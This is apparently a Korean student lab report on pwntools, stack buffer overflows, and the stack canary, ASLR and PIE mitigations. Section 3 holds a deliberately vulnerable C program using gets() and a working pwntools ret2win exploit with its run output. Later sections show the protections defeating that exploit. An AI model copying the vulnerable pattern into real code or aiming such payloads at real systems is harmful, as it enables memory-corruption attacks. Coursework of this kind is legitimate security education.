# 3차 과제 보고서

## 1. pwntools 명령어 조사

pwntools는 CTF 및 익스플로잇 개발에 특화된 Python 라이브러리다.

### 연결

| 함수 | 설명 |
|---|---|
| `process("./vuln")` | 로컬 바이너리 실행 및 연결 |
| `remote("host", port)` | 원격 서버 연결 |

### 송수신

| 함수 | 설명 |
|---|---|
| `send(b"data")` | 데이터 전송 |
| `sendline(b"data")` | 데이터 + `\n` 전송 |
| `recvuntil(b"Input: ")` | 특정 문자열이 올 때까지 수신 |
| `recvline()` | `\n` 까지 한 줄 수신 |
| `interactive()` | 익스플로잇 성공 후 직접 입력 모드 (쉘 획득 시 사용) |

### 패킹

| 함수 | 설명 |
|---|---|
| `p32(addr)` | 주소를 32비트 리틀엔디안 바이트로 변환 |
| `p64(addr)` | 주소를 64비트 리틀엔디안 바이트로 변환 |

리틀엔디안은 주소를 메모리에 역순으로 저장하는 방식이다.
예: `p32(0x8049176)` → `b'\x76\x91\x04\x08'`

### ELF 분석

```python
elf = ELF("./vuln")
elf.symbols["secret"]  # 함수 주소 자동으로 가져오기
```

바이너리에서 함수 주소를 자동으로 추출해준다. 주소를 하드코딩하지 않아도 된다.

---

## 2. 버퍼 오버플로우

버퍼 오버플로우(BOF)란 할당된 버퍼 크기보다 많은 데이터를 입력했을 때
인접한 메모리 영역을 덮어쓰는 취약점이다.

### 스택 구조

함수 호출 시 스택은 다음과 같이 구성된다.

```
[ buf  (버퍼)  ]  ← 입력 시작
[ SFP  (4byte) ]  ← Saved Frame Pointer
[ RET  (4byte) ]  ← 반환 주소 (공격 목표)
```

BOF가 발생하면 버퍼를 넘어서 SFP, RET까지 덮어쓸 수 있다.
RET을 원하는 함수 주소로 덮으면 프로그램 흐름을 바꿀 수 있다.

### 발생 원인

`gets()`, `strcpy()` 등 입력 크기를 검사하지 않는 함수 사용 시 발생한다.

---

## 3. BOF 코드 & 익스플로잇

### 취약한 C 코드 (vuln.c)

```c
#include <stdio.h>

void secret() {
    puts("you got me!");
}

void vuln() {
    char buf[32];
    gets(buf);  // 취약점: 입력 크기 제한 없음
}

int main() {
    vuln();
    return 0;
}
```

### 컴파일

```bash
gcc -o vuln vuln.c -fno-stack-protector -no-pie -m32 -w
```

### BOF 확인

```bash
python3 -c "print('A'*100)" | ./vuln
# Segmentation fault (core dumped)
```

A를 100개 입력하자 버퍼(32byte)를 넘어 RET까지 덮어 Segfault 발생.

### 오프셋 계산

gdb에서 패턴으로 RET까지의 오프셋을 확인했다.

```
buf 32byte + SFP 4byte + 기타 8byte = 44byte
```

### secret() 주소 확인

```
(gdb) p secret
$1 = 0x8049176 <secret>
```

### 익스플로잇 코드 (exploit.py)

```python
from pwn import *

p = process("./vuln")
payload = b"A" * 44 + p32(0x8049176)
p.sendline(payload)
p.interactive()
```

### 실행 결과

```
[+] Starting local process './vuln'
[*] Switching to interactive mode
you got me!
```

RET을 `secret()` 주소로 덮어 함수 실행 성공. 이를 **ret2win** 기법이라 한다.

---

## 4. Stack Canary

### 개요

Stack Canary는 BOF를 감지하기 위해 GCC가 자동으로 삽입하는 보호 기법이다.
함수 시작 시 스택에 랜덤 값(카나리)을 넣고, 함수 종료 시 값이 바뀌었는지 확인한다.

### 스택 구조

```
[ buf    (버퍼)  ]
[ canary (4byte) ]  ← 랜덤 값
[ SFP   (4byte)  ]
[ RET   (4byte)  ]
```

BOF로 버퍼를 넘으면 카나리 값이 덮이고, 함수 종료 시 이를 감지해 프로그램을 종료한다.

### 실습

카나리를 활성화하여 컴파일 후 동일한 익스플로잇 시도:

```bash
gcc -o vuln_canary vuln.c -no-pie -m32 -w
python3 exploit.py
```

### 결과

```
*** stack smashing detected ***: terminated
[*] Process './vuln_canary' stopped with exit code -6 (SIGABRT)
```

카나리가 BOF를 감지하여 프로그램 강제 종료.

### checksec 확인

```
Stack: Canary found
```

---

## 5. ASLR / PIE

### ASLR (Address Space Layout Randomization)

실행할 때마다 스택, 힙, 라이브러리 주소를 랜덤으로 배치하는 OS 수준 보호 기법이다.

```bash
ldd ./vuln  # 실행마다 libc 주소가 달라짐
```

### PIE (Position Independent Executable)

바이너리 자체(함수, 코드 주소)도 랜덤으로 배치하는 컴파일 옵션이다.

| | PIE 없음 | PIE 있음 |
|---|---|---|
| 바이너리 주소 | 고정 (`0x8049176`) | 랜덤 (베이스 + 오프셋) |
| 익스플로잇 | 주소 하드코딩 가능 | 주소 유출 필요 |

### 실습

```bash
gcc -o vuln_pie vuln.c -fno-stack-protector -m32 -w
checksec --file=./vuln_pie
# PIE: PIE enabled
```

동일한 익스플로잇 시도 시 실패:

```
[*] Process './vuln_pie' stopped with exit code -11 (SIGSEGV)
```

PIE가 활성화되면 실행마다 베이스 주소가 바뀌어 하드코딩한 주소가 무효화된다.

실제로 두 프로세스의 베이스 주소가 다름을 확인:

```
5655f000  ← 첫 번째 프로세스
56641000  ← 두 번째 프로세스
```

### ASLR vs PIE 요약

| 기법 | 적용 주체 | 랜덤화 대상 |
|---|---|---|
| ASLR | OS | 스택, 힙, 라이브러리 |
| PIE | 컴파일러 | 바이너리 자체 주소 |

ASLR + PIE가 모두 활성화되면 모든 주소가 랜덤화되어
주소 유출 없이는 익스플로잇이 불가능하다.